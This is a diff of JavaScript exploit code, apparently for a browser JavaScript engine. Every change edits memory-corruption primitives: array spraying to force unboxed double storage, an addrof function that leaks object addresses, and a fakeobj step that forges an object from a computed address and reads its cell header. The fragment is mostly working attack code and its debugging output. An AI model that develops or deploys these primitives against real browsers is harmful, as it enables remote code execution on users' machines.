@@ -72,11 +72,12 @@ var qwordAsFloat = qword => {
           let addrof = null;
 
           for (var i = 0; i < 100; i++) keep.push([1.1*i]);
-          let a0 = [0,0,0,0,0,0,0,0,0,0];
-          let a1 = [0,0,0,0,0,0,0,0,0,0];
+          let noCoW = 13.37;
+          let a0 = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
+          let a1 = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
           // transition to unboxed double storage
-          a1[3] = 13.37;
-          let b0 = [0,0,0,0,0,0,0,0,0,0];
+          a1[0] = 13.37;
+          let b0 = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
           let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
 
           // put zeroes in first two slots so JSCallbackData destruction is safe
@@ -106,7 +107,7 @@ var qwordAsFloat = qword => {
               return;
             }
 
-            // temporary implementations
+            /*// temporary implementations
             addrof = (val) => {
               b1[0] = val;
               return parseInt(float2bigint(a1[offset],true),16);
@@ -126,7 +127,7 @@ var qwordAsFloat = qword => {
             port.postMessage("obj @ " + addr.toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
-            /*let fakeArr = fakeobj(addr + 0x10n); //no way around this im forced to use bigint for fakeobj :(
+            let fakeArr = fakeobj(addr + 0x10n); //no way around this im forced to use bigint for fakeobj :(
             port.postMessage("hey");
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0],true) - 0x1;
